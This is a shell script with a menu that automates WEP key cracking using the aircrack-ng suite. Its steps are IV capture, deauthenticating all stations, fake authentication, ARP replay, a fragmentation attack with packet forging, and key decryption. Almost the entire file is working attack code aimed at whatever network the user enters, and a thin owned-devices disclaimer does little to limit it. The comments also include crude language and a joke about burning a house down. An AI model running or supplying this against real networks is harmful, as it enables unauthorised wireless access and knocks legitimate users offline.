#!/bin/sh
#Attatatatatatatatack.sh

	# Fully functional IV capturing and decrypting shell script.
	# Disclaimer: for use on personally owned devices only. 
	# I hold no responsibilities for your retarded <s>ass</s> actions

	# Anyways
	# It took all about seven hours to write this from scratch.
	# This second one's a bit more complex than the first.
	# Learned a good lesson through all of this.

	# This unintentionally wandered itself into my life.
	# Took kind of a leap of faith on it and dove in head first.
	# Wasn't too sure about it, but I'm glad that it happened.
	# Life's too short to wait around for what you want.
	# When life gives you lemons, burn his fucking house down.


ivs=~/*.ivs 
replay=replay*
fragment=fragment*
arp=~/arp-request*
cleanup() {
    rm $ivs 
    rm $fragment 
    rm $arp
    rm $replay
    clear
}
trap "cleanup" 0
trap "clear; echo Get back in there!" 2
clear

# set $interface
echo "Which wireless interface should I use?"
echo
ifconfig -a | grep -Ei "(wlan)" | sed -e 's/link.*hwaddr //i' -e 's/-/:/g'
echo
echo

usedInterface=~/usedInterface.last
if [ -f $usedInterface ];
then
    echo "Hey, I found some used interfaces"
    cat $usedInterface | grep -v "^$" | tail
    echo
    echo
else
    echo "I found no previously used interfaces. Carry on."
    echo
    echo
fi

read -p "Enter your interface name and physical address: " interface host
echo $interface $host >> ~/usedInterface.last
ifconfig $interface down
clear

# set $bssid $channel $essid
echo "Where shall we aim this cannon at, sir?"
echo
echo

usedAttacks=~/usedAttacks.last
if [ -f $usedAttacks ];
then
    echo "Hey, I found some used attacks. Danger Close"
    cat $usedAttacks | grep -v "^$" | tail
    echo
    echo
else
    echo "Oops, no bacon. I didn't find any previous attack vectors."
    echo "You're on your own now."
    echo
    echo
fi

read -p "What bssid? channel? essid? " bssid channel essid
echo $bssid $channel $essid >> ~/usedAttacks.last
clear


# standard attack
airodumpng() {
    konsole -e airodump-ng --bssid $bssid --channel $channel --ivs -w ~/$essid $interface &
}
airodumpng9() {
    xterm -e airodump-ng --bssid $bssid --channel $channel --ivs -w ~/$essid $interface &
}

aireplayng0 () {
    aireplay-ng -0 10 -a $bssid $interface
}

aireplayng1() {
    aireplay-ng -1 0 -a $bssid $interface
}

aireplayng3() {
    aireplay-ng -3 -b $bssid $interface
}

aircrackng() {
    aircrack-ng -b $bssid -e $essid ~/$essid*.ivs
}


# fragmentation attack
aireplayng5() {
    aireplay-ng -5 -b $bssid $interface
}
packetforgeng() {
    packetforge-ng -0 -a $bssid -h $host -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w ~/arp-request
}
aireplayng2() {
    aireplay-ng -2 -r $arp $interface
}



i=1
while [ $i == 1 ]; do

    echo "Choose a missile"
    echo "** Standard Attack **"
    echo "[0] airdump-ng (konsole)"
    echo "[9] airdump-ng (xterm)"
    echo "[1] aireplay-ng -0 deauthenticate all stations"
    echo "[2] aireplay-ng -1 fake authentication with AP"
    echo "[3] aireplay-ng -3 standard ARP-request replay"
    echo "[4] aircrack-ng decrypt IVs"
    echo
    echo "** Fragmentation Attack **"
    echo "[6] aireplay-ng -5 generate valid keystream"
    echo "[7] packetforge-ng create arp request packet"
    echo "[8] aireplay-ng -2 replay arp request packet"
    echo
    echo "[Quit] Quit."
    read -p "Choose an attack: " runattack
    
    if [ "$runattack" == 0 ]; then
	airodumpng
	clear
    else
	if [ "$runattack" == 1 ]; then
	    clear
	    aireplayng0
	    clear
	else
	    if [ "$runattack" == 2 ]; then
		clear
		aireplayng1
		sleep 2
		clear
	    else
		if [ "$runattack" == 3 ]; then
		    clear
		    aireplayng3
		    clear
		else
		    if [ "$runattack" == 4 ]; then
			clear
			aircrackng
			read -p "Press any key to continue"
			clear
		    else
			if [ "$runattack" == 6 ]; then
			    clear
			    aireplayng5
			    read -p "Keystream success! Now go forge that packet!"
			    clear
			else
			    if [ "$runattack" == 7 ]; then
				clear
				packetforgeng
				read -p "Forging complete! Now go replay it!"
				clear
			    else
				if [ "$runattack" == 8 ]; then
				    clear
				    aireplayng2
				else
				    if [ "$runattack" == 9 ]; then
					clear
					airodumpng9
					clear
				    else
					if [ "$runattack" == Quit ] || [ "$runattack" == quit ] ; then
					    echo "We're done here."
					    i=0
					else
					    echo
					    echo
					    read -p "Choose something!"
					    clear
					fi
					
				    fi
				fi
			    fi
			fi
		    fi
		fi
	    fi
	fi
    fi
done